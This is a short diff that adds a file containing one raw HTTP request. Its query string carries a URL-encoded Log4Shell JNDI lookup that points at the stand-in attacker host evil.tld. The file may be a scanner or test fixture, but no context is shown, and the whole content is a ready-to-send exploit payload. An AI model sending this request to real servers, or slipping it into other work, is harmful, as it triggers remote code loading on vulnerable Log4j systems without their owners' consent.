@@ -1,0 +1,4 @@
+GET /a?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fx%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
